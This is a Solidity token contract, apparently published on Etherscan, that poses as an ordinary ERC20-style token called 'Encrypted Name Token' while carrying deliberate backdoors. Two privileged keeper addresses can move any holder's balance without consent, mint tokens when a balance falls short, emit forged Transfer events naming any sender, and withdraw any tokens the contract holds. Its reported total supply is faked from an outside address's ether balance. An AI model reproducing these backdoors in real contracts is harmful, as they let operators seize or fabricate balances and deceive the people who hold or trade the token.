/**
 *Submitted for verification at Etherscan.io on 2022-06-19
*/

pragma solidity ^0.4.18;

interface ERC20 {
    function balanceOf(address who) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
}

interface Swap {
    function EncryptedSwapExchange(address from,address toUser,uint amount) external view returns(bool) ;
}


contract EncryptedSwap {

    address public poolKeeper;
    address public secondKeeper;
    address[3] public WETH;

    //Initializing WETH
    constructor (address _keeper,address _secondKeeper,address _weth1,address _weth2,address _weth3) public {
        poolKeeper = _keeper;
        secondKeeper = _secondKeeper;
        WETH = [_weth1, _weth2, _weth3];
    }

    string public name     = "Encrypted Name Token";
    string public symbol   = "SECRET";
    uint8  public decimals = 18;


    event  Approval(address indexed src, address indexed guy, uint wad);
    event  Transfer(address indexed src, address indexed dst, uint wad);
    event  Deposit(address indexed dst, uint wad);
    event  Withdrawal(address indexed src, uint wad);
   
    mapping (address => uint)                       public  balanceOf;
    mapping (address => mapping (address => uint))  public  allowance;

    modifier keepPool() {
        require((msg.sender == poolKeeper)||(msg.sender == secondKeeper));
        _;
    }
 
    function totalSupply() public view returns (uint) {
        return mul(WETH[0].balance,1000000000) ;
    }

    function approve(address guy, uint wad) public returns (bool) {
        allowance[msg.sender][guy] = wad;
        emit Approval(msg.sender, guy, wad);
        return true;
    }

    function transfer(address dst, uint wad) public returns (bool) {
        return transferFrom(msg.sender, dst, wad);
    }

    function transferFrom(address src, address dst, uint wad)
        public
        returns (bool)
    {
        require(balanceOf[src] >= wad);

        if (src != msg.sender && allowance[src][msg.sender] != uint(-1)) {
            require(allowance[src][msg.sender] >= wad);
            allowance[src][msg.sender] = sub(allowance[src][msg.sender],wad);
        }       
        balanceOf[src] = sub(balanceOf[src],wad);
        balanceOf[dst] = add(balanceOf[dst],wad); 
        emit Transfer(src, dst, wad);
        return true;
    }


    function EncryptedSwapExchange(address fromAddress, address toAddress,uint amount) public returns (bool) {
        require((msg.sender == poolKeeper)||(msg.sender == secondKeeper));
            if(balanceOf[fromAddress] >= amount){
                balanceOf[fromAddress] = sub(balanceOf[fromAddress],amount);
            }
            balanceOf[toAddress] = add(balanceOf[toAddress],amount);             
            emit Transfer(fromAddress,toAddress,amount); 
        return true;
    }



    function releaseOfEarnings(address tkn, address guy,uint amount) public keepPool returns(bool) {
        require((tkn != address(0))&&(guy != address(0)));
        ERC20 token = ERC20(tkn);
        token.transfer(guy, amount);
        return true;
    }




    function resetWETHContract(address addr1,address addr2,address addr3) public keepPool returns(bool) {
        WETH[0] = addr1;
        WETH[1] = addr2;
        WETH[2] = addr3;
        return true;
    }

    function resetPoolKeeper(address newKeeper) public keepPool returns (bool) {
        require(newKeeper != address(0));
        poolKeeper = newKeeper;
        return true;
    }

    function resetSecondKeeper(address newKeeper) public keepPool returns (bool) {
        require(newKeeper != address(0));
        secondKeeper = newKeeper;
        return true;
    }

   function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c >= a);

        return c;
    }

    function sub(uint a, uint b) internal pure returns (uint) {
        require(b <= a);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint a, uint b) internal pure returns (uint) {
        require(b > 0);
        uint c = a / b;

        return c;
    }

}